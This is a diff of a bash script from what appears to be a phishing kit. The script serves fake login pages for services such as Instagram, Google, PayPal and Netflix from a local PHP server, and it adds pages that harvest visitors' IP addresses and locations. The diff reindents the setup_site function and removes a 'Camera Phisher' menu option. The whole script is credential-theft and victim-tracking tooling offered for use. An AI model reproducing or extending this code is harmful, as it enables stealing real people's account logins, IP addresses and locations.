@@ -501,17 +501,18 @@ cusport() {
 
 ## Setup website and start php server
 setup_site() {
-	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Setting up server..."${WHITE}
-	if [ "$website" = "camera" ]; then
-		cp -rf .sites/"$website"/* .server/www
-		cp -f .sites/"$website"/location.php .server/www/
-	else
-		cp -rf .sites/"$website"/* .server/www
-		cp -f .sites/ip.php .server/www/
-	fi
-	echo -ne "\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Successfully set up PHP server!"${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+    echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Setting up server..."${WHITE}
+    if [ "$website" = "camera" ]; then
+        cp -rf .sites/"$website"/* .server/www
+        cp -f .sites/"$website"/location.php .server/www/
+    else
+        cp -rf .sites/"$website"/* .server/www
+        cp -f .sites/ip.php .server/www/
+    fi
+    echo -ne "\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Successfully set up PHP server!"${WHITE}
+    cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
+
 
 ## Get IP address
 capture_ip() {
@@ -896,7 +897,7 @@ main_menu() {
 		${WHITE}04. Instagram	${WHITE}14. Github	${WHITE}24. Xbox
 		${WHITE}05. Google	${WHITE}15. Shopify	${WHITE}25. Verizon
 		${WHITE}06. Bitcoin	${WHITE}16. Ebay	${WHITE}26. Wifi
-		${WHITE}07. Crypto	${WHITE}17. Pinterest	${WHITE}27. Camera Phisher
+		${WHITE}07. Crypto	${WHITE}17. Pinterest		
 		${WHITE}08. Microsoft	${WHITE}18. Discord		
 		${WHITE}09. Netflix	${WHITE}19. Reddit		
 		${WHITE}10. Paypal	${WHITE}20. Messenger		
@@ -1000,9 +1001,6 @@ main_menu() {
 			tunnel_menu;;
 		26)
 			website="wifi"
-			tunnel_menu;;
-		27)
-			website="camera"
 			tunnel_menu;;
 		99)
 			about;;
